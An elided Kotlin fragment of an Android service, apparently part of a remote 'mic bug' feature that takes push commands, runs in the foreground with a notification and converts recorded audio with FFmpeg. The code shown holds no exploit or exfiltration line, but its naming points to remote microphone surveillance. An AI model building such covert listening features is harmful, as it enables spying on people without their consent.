...
class MicBugCommandProcessingBaseImplI(
    val service: Service,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : MicBugCommandProcessingBaseI(service.applicationContext) {
    ...
    override fun initialize() {
        ...
        val notification =
            NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                ...
                .build()
        service.startForeground(MIC_BUG_NOTIFICATION_ID, notification)
    }
    ...
    override fun parseIntent(intent: Intent?) {
        intent?.let {
            ...
            micBugPush = it.getParcelableExtra(MIC_BUG_PUSH)
...
//            val rc = FFmpeg.execute("-y -i $mFilePath -ar 44100 -ac 2 -ab 20k -c:v mpeg4 $destFilePAth")
                    when (val rc = FFmpeg.execute("-y -i $mFilePath -ar 44100 -ac 2 -ab 20k -c:v mpeg4 $destFilePAth")) {
                        RETURN_CODE_SUCCESS -> {
                            logVerbose(
